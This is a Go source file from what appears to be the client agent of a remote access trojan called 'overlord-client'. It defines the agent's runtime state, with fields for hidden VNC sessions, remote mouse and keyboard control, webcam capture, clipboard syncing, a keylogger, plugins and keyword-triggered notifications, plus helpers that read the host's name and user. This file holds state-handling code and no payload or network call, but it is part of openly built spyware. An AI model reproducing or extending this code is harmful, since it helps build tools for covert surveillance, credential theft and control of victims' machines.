package runtime

import (
	"context"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"overlord-client/cmd/agent/config"
	"overlord-client/cmd/agent/keylogger"
	"overlord-client/cmd/agent/plugins"
	"overlord-client/cmd/agent/wire"
)

type Env struct {
	LastPongUnixMs     int64
	Conn               wire.Writer
	Cfg                config.Config
	Cancel             context.CancelFunc
	Console            *ConsoleHub
	SelectedDisplay    int
	MouseControl       bool
	KeyboardControl    bool
	CursorCapture      bool
	DesktopDuplication bool
	DesktopCancel      context.CancelFunc
	DesktopDone        chan struct{}
	DesktopMu          sync.Mutex
	// HVNC fields
	HVNCSelectedDisplay int
	HVNCMouseControl    bool
	HVNCKeyboardControl bool
	HVNCCursorCapture   bool
	HVNCCancel          context.CancelFunc
	HVNCDone            chan struct{}
	HVNCMu              sync.Mutex
	// Virtual mode fields
	VirtualMouseControl    bool
	VirtualKeyboardControl bool
	VirtualCursorCapture   bool
	VirtualCancel          context.CancelFunc
	VirtualDone            chan struct{}
	VirtualMu              sync.Mutex
	// Webcam shit
	WebcamDeviceIndex int
	WebcamFPS         int
	WebcamUseMaxFPS   bool
	WebcamQuality     int
	WebcamCodec       string
	WebcamCancel      context.CancelFunc
	WebcamDone        chan struct{}
	WebcamMu          sync.Mutex
	// Cliboard sync stuff
	ClipboardSyncCancel context.CancelFunc
	ClipboardSyncDone   chan struct{}
	ClipboardSyncMu     sync.Mutex
	ClipboardSyncSource string
	// Other fields
	Plugins                   *plugins.Manager
	Keylogger                 *keylogger.Keylogger
	NotificationMu            sync.RWMutex
	NotificationKeywords      []string
	NotificationMinIntervalMs int
	NotificationClipboard     bool
}

func (e *Env) SetNotificationConfig(keywords []string, minIntervalMs int, clipboardEnabled bool) {
	e.NotificationMu.Lock()
	e.NotificationKeywords = keywords
	if minIntervalMs > 0 {
		e.NotificationMinIntervalMs = minIntervalMs
	}
	e.NotificationClipboard = clipboardEnabled
	e.NotificationMu.Unlock()
}

func (e *Env) GetNotificationKeywords() []string {
	e.NotificationMu.RLock()
	defer e.NotificationMu.RUnlock()
	if len(e.NotificationKeywords) == 0 {
		return nil
	}
	out := make([]string, len(e.NotificationKeywords))
	copy(out, e.NotificationKeywords)
	return out
}

func (e *Env) GetNotificationMinIntervalMs() int {
	e.NotificationMu.RLock()
	defer e.NotificationMu.RUnlock()
	return e.NotificationMinIntervalMs
}

func (e *Env) GetClipboardEnabled() bool {
	e.NotificationMu.RLock()
	defer e.NotificationMu.RUnlock()
	return e.NotificationClipboard
}

func (e *Env) SetLastPong(tsMillis int64) {
	if tsMillis <= 0 {
		tsMillis = time.Now().UnixMilli()
	}
	atomic.StoreInt64(&e.LastPongUnixMs, tsMillis)
}

func (e *Env) LastPong() time.Time {
	ms := atomic.LoadInt64(&e.LastPongUnixMs)
	if ms <= 0 {
		return time.Time{}
	}
	return time.UnixMilli(ms)
}

func Hostname() string {
	h, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return h
}

func CurrentUser() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	return "unknown"
}

func MinDuration(a, b time.Duration) time.Duration {
	if a < b {
		return a
	}
	return b
}
